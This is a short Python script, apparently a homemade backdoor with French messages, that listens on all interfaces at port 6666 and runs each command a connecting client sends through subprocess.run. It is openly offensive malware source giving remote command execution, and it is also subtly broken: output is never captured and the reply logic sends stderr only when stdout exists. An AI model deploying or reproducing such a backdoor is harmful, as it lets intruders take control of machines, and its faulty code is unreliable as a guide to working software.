import socket
import subprocess

#########################################################################################

evil_socket_port = 6666
evil_socket_IP = '0.0.0.0'
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((evil_socket_IP, evil_socket_port))

#########################################################################################

def main():
    server_socket.listen(5)
    client_socket, client_address = server_socket.accept()
    print(f"Connexion acceptée depuis {client_address}")
    try :
        while True:
            message = client_socket.recv(1024).decode()
            data = subprocess.run(message)
            if data.stdout:
                client_socket.send(data.stderr.encode())
            else:
                client_socket.send("Rien a envoyer".encode())
    except KeyboardInterrupt:
        server_socket.close()


main()